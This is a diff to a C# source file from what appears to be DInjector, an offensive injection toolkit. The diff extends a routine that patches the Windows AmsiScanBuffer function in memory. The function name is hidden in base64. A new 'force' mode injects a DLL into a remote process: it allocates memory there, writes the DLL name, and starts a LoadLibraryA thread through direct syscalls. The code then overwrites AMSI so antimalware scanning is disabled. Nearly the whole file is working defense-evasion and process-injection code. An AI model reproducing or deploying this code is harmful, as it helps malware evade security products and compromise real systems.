@@ -17,12 +17,12 @@ namespace DInjector
         // xor rax, rax
         //static readonly byte[] x64 = new byte[] { 0x48, 0x31, 0xC0 };
 
-        public static void Patch(IntPtr processHandle = default(IntPtr), int processID = 0)
+        public static void Patch(IntPtr processHandle = default(IntPtr), int processID = 0, bool force = true)
         {
-            ChangeBytes(x64, processHandle, processID);
+            ChangeBytes(x64, processHandle, processID, force);
         }
 
-        static void ChangeBytes(byte[] patch, IntPtr processHandle, int processID)
+        static void ChangeBytes(byte[] patch, IntPtr processHandle, int processID, bool force)
         {
             try
             {
@@ -36,21 +36,99 @@ namespace DInjector
                 var funcNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                 var funcName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", funcNameB64)));
 
-                var baseAddress = IntPtr.Zero;
+                var funcAddress = IntPtr.Zero;
                 try
                 {
-                    baseAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, funcName, CanLoadFromDisk: false);
+                    funcAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, funcName, CanLoadFromDisk: force);
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine($"(AM51) [!] {e.Message}, skipping");
+                    Console.WriteLine($"(AM51|force:{force}) [!] {e.Message}, skipping");
                     return;
                 }
+
+                IntPtr regionSize = IntPtr.Zero;
+                NTSTATUS ntstatus = 0;
 
                 if (processHandle != IntPtr.Zero) // if targeting a remote process, calculate remote address of AmsiScanBuffer
                 {
                     var libAddress = DI.DynamicInvoke.Generic.GetLoadedModuleAddress(libName);
-                    var offset = (long)baseAddress - (long)libAddress;
+                    var offset = (long)funcAddress - (long)libAddress;
+
+                    if (force)
+                    {
+                        var loadLibraryAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "LoadLibraryA");
+
+                        #region NtAllocateVirtualMemory (bLibName, PAGE_READWRITE)
+
+                        IntPtr remoteLibAddress = IntPtr.Zero;
+                        var bLibName = Encoding.ASCII.GetBytes(libName);
+                        regionSize = new IntPtr(bLibName.Length + 2);
+
+                        ntstatus = Syscalls.NtAllocateVirtualMemory(
+                            processHandle,
+                            ref remoteLibAddress,
+                            IntPtr.Zero,
+                            ref regionSize,
+                            DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
+                            DI.Data.Win32.WinNT.PAGE_READWRITE);
+
+                        if (ntstatus == NTSTATUS.Success)
+                            Console.WriteLine($"(AM51|force:{force}) [+] NtAllocateVirtualMemory (bLibNameLength), PAGE_READWRITE");
+                        else
+                            throw new Exception($"(AM51|force:{force}) [-] NtAllocateVirtualMemory (bLibNameLength), PAGE_READWRITE: {ntstatus}");
+
+                        #endregion
+
+                        #region NtWriteVirtualMemory (bLibName)
+
+                        var buffer = Marshal.AllocHGlobal(bLibName.Length);
+                        Marshal.Copy(bLibName, 0, buffer, bLibName.Length);
+
+                        uint bytesWritten = 0;
+
+                        ntstatus = Syscalls.NtWriteVirtualMemory(
+                            processHandle,
+                            remoteLibAddress,
+                            buffer,
+                            (uint)bLibName.Length,
+                            ref bytesWritten);
+
+                        if (ntstatus == NTSTATUS.Success)
+                            Console.WriteLine($"(AM51|force:{force}) [+] NtWriteVirtualMemory, bLibName");
+                        else
+                            throw new Exception($"(AM51|force:{force}) [-] NtWriteVirtualMemory, bLibName: {ntstatus}");
+
+                        Marshal.FreeHGlobal(buffer);
+
+                        #endregion
+
+                        #region NtCreateThreadEx (LoadLibraryA)
+
+                        IntPtr hThread = IntPtr.Zero;
+
+                        ntstatus = Syscalls.NtCreateThreadEx(
+                            ref hThread,
+                            DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+                            IntPtr.Zero,
+                            processHandle,
+                            loadLibraryAddress,
+                            remoteLibAddress,
+                            false,
+                            0,
+                            0,
+                            0,
+                            IntPtr.Zero);
+
+                        if (ntstatus == NTSTATUS.Success)
+                            Console.WriteLine($"(AM51|force:{force}) [+] NtCreateThreadEx, LoadLibraryA");
+                        else
+                            throw new Exception($"(AM51|force:{force}) [-] NtCreateThreadEx, LoadLibraryA: {ntstatus}");
+
+                        System.Threading.Thread.Sleep(2000); // sleep till the DLL loads
+
+                        #endregion
+                    }
 
                     var dllNotFound = true;
                     using var process = Process.GetProcessById(processID);
@@ -59,14 +137,14 @@ namespace DInjector
                     {
                         if (!module.ModuleName.Equals(libName, StringComparison.OrdinalIgnoreCase)) continue;
 
-                        baseAddress = new IntPtr((long)module.BaseAddress + offset);
+                        funcAddress = new IntPtr((long)module.BaseAddress + offset);
                         dllNotFound = false;
                         break;
                     }
 
                     if (dllNotFound)
                     {
-                        Console.WriteLine("(AM51) [!] DLL not found in remote process, skipping");
+                        Console.WriteLine($"(AM51|force:{force}) [!] DLL not found in remote process, skipping");
                         return;
                     }
                 }
@@ -75,11 +153,11 @@ namespace DInjector
 
                 #region NtProtectVirtualMemory (PAGE_READWRITE)
 
-                IntPtr protectAddress = baseAddress;
-                var regionSize = (IntPtr)patch.Length;
+                IntPtr protectAddress = funcAddress;
+                regionSize = (IntPtr)patch.Length;
                 uint oldProtect = 0;
 
-                var ntstatus = Syscalls.NtProtectVirtualMemory(
+                ntstatus = Syscalls.NtProtectVirtualMemory(
                     processHandle,
                     ref protectAddress,
                     ref regionSize,
@@ -87,9 +165,9 @@ namespace DInjector
                     ref oldProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, PAGE_READWRITE");
+                    Console.WriteLine($"(AM51|force:{force}) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                 else
-                    throw new Exception($"(AM51) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                    throw new Exception($"(AM51|force:{force}) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
 
                 #endregion
 
@@ -102,18 +180,18 @@ namespace DInjector
 
                     uint bytesWritten = 0;
 
-                    Console.WriteLine("(AM51) [>] Patching in remote process at address: " + string.Format("{0:X}", baseAddress.ToInt64()));
+                    Console.WriteLine($"(AM51|force:{force}) [>] Patching in remote process at address: " + string.Format("{0:X}", funcAddress.ToInt64()));
                     ntstatus = Syscalls.NtWriteVirtualMemory(
                         processHandle,
-                        baseAddress,
+                        funcAddress,
                         buffer,
                         (uint)patch.Length,
                         ref bytesWritten);
 
                     if (ntstatus == NTSTATUS.Success)
-                        Console.WriteLine("(AM51) [+] NtWriteVirtualMemory, patch");
+                        Console.WriteLine($"(AM51|force:{force}) [+] NtWriteVirtualMemory, patch");
                     else
-                        throw new Exception($"(AM51) [-] NtWriteVirtualMemory, patch: {ntstatus}");
+                        throw new Exception($"(AM51|force:{force}) [-] NtWriteVirtualMemory, patch: {ntstatus}");
 
                     Marshal.FreeHGlobal(buffer);
 
@@ -121,8 +199,8 @@ namespace DInjector
                 }
                 else // otherwise (current process), use Copy
                 {
-                    Console.WriteLine("(AM51) [>] Patching in current process at address: " + string.Format("{0:X}", baseAddress.ToInt64()));
-                    Marshal.Copy(patch, 0, baseAddress, patch.Length);
+                    Console.WriteLine($"(AM51|force:{force}) [>] Patching in current process at address: " + string.Format("{0:X}", funcAddress.ToInt64()));
+                    Marshal.Copy(patch, 0, funcAddress, patch.Length);
                 }
 
                 #region NtProtectVirtualMemory (oldProtect)
@@ -132,22 +210,22 @@ namespace DInjector
 
                 ntstatus = Syscalls.NtProtectVirtualMemory(
                     processHandle,
-                    ref baseAddress,
+                    ref funcAddress,
                     ref regionSize,
                     oldProtect,
                     ref tmpProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, oldProtect");
+                    Console.WriteLine($"(AM51|force:{force}) [+] NtProtectVirtualMemory, oldProtect");
                 else
-                    throw new Exception($"(AM51) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
+                    throw new Exception($"(AM51|force:{force}) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
 
                 #endregion
             }
             catch (Exception e)
             {
-                Console.WriteLine($"(AM51) [x] {e.Message}");
-                Console.WriteLine($"(AM51) [x] {e.InnerException}");
+                Console.WriteLine($"(AM51|force:{force}) [x] {e.Message}");
+                Console.WriteLine($"(AM51|force:{force}) [x] {e.InnerException}");
             }
         }
     }
